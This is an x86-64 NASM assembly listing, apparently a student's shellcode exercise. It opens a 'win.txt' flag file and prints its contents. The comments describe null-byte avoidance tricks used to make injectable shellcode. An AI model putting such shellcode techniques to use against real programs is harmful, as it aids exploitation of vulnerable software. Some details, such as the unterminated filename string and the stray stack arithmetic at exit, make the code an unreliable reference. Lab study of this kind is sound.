     1                                  ; Filename: shellcode.asm
     2                                  ; Author: MIDN 2/C Ian Coffey (m261194)
     3                                  ; Copy from win
     4                                  
     5                                  ; Compilation Instructions...
     6                                  ; nasm -felf64 shellcode.asm -o shellcode.o
     7                                  ; ld shellcode.o -o shellcode
     8                                  ; ./shellcode < something.txt
     9                                  
    10                                  bits 64 
    11                                  
    12                                  section .data:
    13 00000000 77696E2E747874              win db 'win.txt'
    14                                  
    15                                  section .text
    16                                      global _start
    17                                  
    18                                  _start:
    19                                      ; Open 'win.txt' file
    20 00000000 4831C0                      xor rax, rax
    21 00000003 48FFC0                      inc rax
    22 00000006 48FFC0                      inc rax
    23 00000009 488D3C25[00000000]          lea rdi, [win]
    24 00000011 4831F6                      xor rsi, rsi
    25 00000014 48FFC6                      inc rsi
    26 00000017 48FFC6                      inc rsi
    27 0000001A 4831D2                      xor rdx, rdx
    28 0000001D 48FFC2                      inc rdx
    29 00000020 48FFC2                      inc rdx
    30 00000023 0F05                        syscall
    31                                  
    32                                      ; Store fd in r8
    33 00000025 4989C0                      mov r8, rax
    34                                  
    35                                      ; Copy cat starting from here
    36                                      ; Read file to stdout
    37 00000028 4831DB                      xor rbx, rbx  ; zero out rbx to prevent null bytes
    38                                                    ; rbx will be used to cmp to rax
    39 0000002B 48FFC3                      inc rbx       ; rbx = 1
    40 0000002E 4831C9                      xor rcx, rcx  ; zero out rcx to prevent null bytes 
    41                                                    ; rcx will be used to allocate memory
    42 00000031 48FFC1                      inc rcx       ; rcx = 1
    43 00000034 4831D2                      xor rdx, rdx  ; zero out rdx to prevent null bytes
    44                                                    ; rdx is used as read size in syscall
    45 00000037 48FFC2                      inc rdx       ; rdx = 1
    46                                      
    47                                  ; Loop & write loop until rax = 0 (EOF thrown)
    48                                  _loop:
    49                                      ; Allocate 1 byte of memory on stack
    50 0000003A 4829CC                      sub rsp, rcx
    51                                  
    52                                      ; Setup syscall
    53 0000003D 4C89C7                      mov rdi, r8   ; rdi = 'win.txt'
    54 00000040 4889E6                      mov rsi, rsp  ; location of buffer
    55 00000043 4831C0                      xor rax, rax  ; 0 = read(win, buffer, rdx=1)
    56 00000046 0F05                        syscall       ; call read()
    57                                      
    58                                      ; Check if 0 (EOF) is in rax
    59 00000048 4839D8                      cmp rax, rbx
    60 0000004B 7511                        jne exit
    61 0000004D 480F1FC0                    nop rax       ; NOP to scew null bytes
    62                                  
    63                                      ; Setup syscall for write
    64 00000051 4831FF                      xor rdi, rdi  ; rdi = 0
    65 00000054 48FFC7                      inc rdi       ; stdout = 1 
    66 00000057 0F05                        syscall       ; 1 = write(stdout, buffer, rdx=1)
    67                                      
    68                                      ; Deallocate 1 byte from the stack
    69 00000059 4801CC                      add rsp, rcx
    70 0000005C EBDC                        jmp _loop
    71                                  
    72                                  exit:
    73 0000005E 4801E6                      add rsi, rsp  ; Reset stack and return
    74 00000061 4831C0                      xor rax, rax  ; rax = 0
    75 00000064 48FFC0                      inc rax       ; rax = 1
    76 00000067 48FFC0                      inc rax       ; rax = 2
    77 0000006A 48C1E005                    shl rax, 5    ; rax = 64
    78 0000006E 4883E804                    sub rax, 4    ; rax = 60
    79 00000072 4831FF                      xor rdi, rdi  ; rdi = 0
    80 00000075 0F05                        syscall       ; exit(0)
    81                                  
    82                                  
    83                                      
